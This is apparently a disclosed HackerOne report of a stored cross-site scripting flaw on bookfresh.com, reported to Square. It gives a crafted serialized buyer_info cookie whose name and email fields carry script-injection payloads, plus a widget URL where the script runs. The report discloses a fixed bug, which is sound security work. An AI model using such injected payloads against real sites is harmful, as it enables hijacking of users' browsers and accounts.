@@ -1,0 +1,19 @@
+ReportLink:https://hackerone.com/reports/27468
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/4lemon
+ReportedTo:Square(square)
+BountyAmount:400.0
+Severity:
+State:Closed
+DateOfDisclosure:21.12.2014 10:01:57
+
+Summary:
+
+1. There is buyer_info cookie. Let set it to this value:
+a:9:{s:10:"first_name";s:47:"\"><a>xss here</a><script>alert('xss')</script>";s:9:"last_name";s:20:"sirname\"><a>xss</a>";s:5:"email";s:26:"email@foo.com\"><a>xss</a>";s:5:"phone";s:10:"1234567890";s:7:"address";s:5:"false";s:8:"address2";N;s:4:"city";N;s:5:"state";N;s:7:"zipcode";s:5:"false";}
+As you see this is XSS payload. Affected parameters is: first_name, last_name, email
+Cookie might be set thru some other XSS issue on *.bookfresh.com domains.
+2. After that open, for example:
+http://www.bookfresh.com/index.html?view=mini_widget&id=57e78754bb7e0739a1cda3b2fdcc7163
+
+XSS fired twice - on load and after switch to "Ask a Question" tab.
